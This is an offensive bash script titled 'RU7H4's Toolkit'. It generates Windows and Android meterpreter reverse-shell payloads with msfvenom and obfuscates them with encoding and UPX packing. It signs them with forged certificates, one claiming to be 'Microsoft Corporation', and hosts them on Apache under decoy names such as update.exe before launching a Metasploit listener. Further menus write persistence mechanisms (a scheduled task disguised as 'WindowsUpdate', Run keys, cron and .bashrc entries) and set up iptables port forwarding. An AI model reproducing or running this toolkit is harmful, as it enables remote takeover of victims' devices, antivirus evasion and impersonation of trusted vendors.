#!/bin/bash
clear
echo -e "\e[91m"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░░▒▓████████▓▒░▒▓████████▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo -e "\e[0m"
echo "RU7H4's Toolkit"
echo "-----------------------------------------------------"

# Ensure script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "\e[91m[-] This script must be run as root!\e[0m"
    exit 1
fi

# Get the local IP address
LHOST=$(hostname -I | awk '{print $1}')

# Main Menu
echo "[1] Devices (Windows/Android)"
echo "[2] Post-Exploitation"
echo "[3] Port Forwarding"
read -p "Select an option (1-3): " MAIN_OPTION

# Function to check for required tools
check_requirements() {
    local tools=("$@")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            echo "[!] $tool is not installed. Please install it to continue."
            exit 1
        fi
    done
}

# Devices Menu
if [[ $MAIN_OPTION -eq 1 ]]; then
    echo "[1] Windows"
    echo "[2] Android"
    read -p "Select a device type (1 or 2): " DEVICE_TYPE
    if [[ $DEVICE_TYPE -eq 1 ]]; then
        # Check if msfvenom and apache2 are available
        check_requirements "msfvenom apache2"

        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
        echo "[+] Generating Windows payload with obfuscation..."
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 10 -f exe -o raw_$PAYLOAD_NAME

        if [ -s raw_$PAYLOAD_NAME ]; then
            echo "[+] Applying UPX obfuscation..."
            if command -v upx &>/dev/null; then
                upx --best --lzma raw_$PAYLOAD_NAME -o $PAYLOAD_NAME
                rm raw_$PAYLOAD_NAME
            else
                echo "[!] UPX not installed, renaming raw payload."
                mv raw_$PAYLOAD_NAME $PAYLOAD_NAME
            fi

            echo "[+] Signing payload with fake certificate..."
            if command -v osslsigncode &>/dev/null; then
                openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=Microsoft Corporation"
                osslsigncode sign -certs cert.pem -key key.pem -in $PAYLOAD_NAME -out signed_$PAYLOAD_NAME
                mv signed_$PAYLOAD_NAME $PAYLOAD_NAME
                rm key.pem cert.pem
            else
                echo "[!] osslsigncode not installed, skipping signing."
            fi

            echo "[+] Setting up Apache server..."
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            mv $PAYLOAD_NAME $WEB_DIR/
            echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
        else
            echo "[-] Payload generation failed. Check msfvenom parameters."
            exit 1
        fi

        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo "[+] Metasploit Listener script saved as listener.rc"
        echo "[+] Starting Metasploit Listener..."
        msfconsole -r listener.rc

    elif [[ $DEVICE_TYPE -eq 2 ]]; then
        # Check for msfvenom, apache2, apktool and jarsigner
        check_requirements "msfvenom apache2 apktool jarsigner"

        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
        echo "[+] Generating Android payload with obfuscation..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o raw_$PAYLOAD_NAME

        if [ -s raw_$PAYLOAD_NAME ]; then
            echo "[+] Obfuscating APK using APKTool..."
            apktool d raw_$PAYLOAD_NAME -o temp_apk
            apktool b temp_apk -o $PAYLOAD_NAME
            rm -rf temp_apk raw_$PAYLOAD_NAME

            echo "[+] Signing APK with fake certificate..."
            keytool -genkey -v -keystore fake.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Android"
            jarsigner -verbose -keystore fake.keystore -storepass password -keypass password $PAYLOAD_NAME android
            rm fake.keystore

            echo "[+] Setting up Apache server..."
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            mv $PAYLOAD_NAME $WEB_DIR/
            echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
        else
            echo "[-] Payload generation failed. Check msfvenom parameters."
            exit 1
        fi

        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo "[+] Metasploit Listener script saved as listener.rc"
        echo "[+] Starting Metasploit Listener..."
        msfconsole -r listener.rc

    else
        echo "[-] Invalid device option!"
        exit 1
    fi
elif [[ $MAIN_OPTION -eq 2 ]]; then
    # Post-Exploitation Menu
    echo "[+] Post-Exploitation Options:"
    echo "[1] Windows Persistence"
    echo "[2] Linux Persistence"
    echo "[3] Android Persistence"
    read -p "Select an option (1-3): " PERSIST_OPTION

    # Handle persistence
    case $PERSIST_OPTION in
        1)
            read -p "Enter payload name (e.g., backdoor.exe): " PAYLOAD_NAME
            echo "[+] Setting up Windows persistence..."
            cat <<EOF > win_persist.bat
@echo off
schtasks /create /tn "WindowsUpdate" /tr "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /sc ONLOGON /rl HIGHEST
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /f
EOF
            echo "[+] Windows persistence script saved as win_persist.bat"
            ;;
        2)
            read -p "Enter payload path (e.g., /home/user/backdoor): " PAYLOAD_PATH
            echo "[+] Setting up Linux persistence..."
            (crontab -l 2>/dev/null; echo "@reboot $PAYLOAD_PATH &") | crontab -
            echo "$PAYLOAD_PATH &" >> ~/.bashrc
            echo "[+] Linux persistence configured."
            ;;
        3)
            read -p "Enter payload path on Android device (e.g., /sdcard/update.apk): " PAYLOAD_PATH
            echo "[+] Setting up Android persistence..."
            echo "am start -a android.intent.action.VIEW -n com.android.packageinstaller/.PackageInstallerActivity -d file://$PAYLOAD_PATH" > android_persist.sh
            echo "[+] Android persistence script saved as android_persist.sh"
            ;;
        *)
            echo "[-] Invalid option!"
            exit 1
            ;;
    esac
elif [[ $MAIN_OPTION -eq 3 ]]; then
    read -p "Enter the port or ports to forward (comma-separated, e.g., 8080,443): " FORWARD_PORTS
    IFS=',' read -r -a PORTS <<< "$FORWARD_PORTS"
    echo "[+] Forwarding the following ports: ${PORTS[@]}"
    for PORT in "${PORTS[@]}"; do
        echo "[+] Forwarding port $PORT..."
        iptables -t nat -A PREROUTING -p tcp --dport $PORT -j DNAT --to-destination $LHOST:$PORT
        iptables -t nat -A POSTROUTING -p tcp --dport $PORT -j MASQUERADE
    done
    echo "[+] Ports have been forwarded. You can now access services at $LHOST."
else
    echo "[-] Invalid option!"
    exit 1
fi
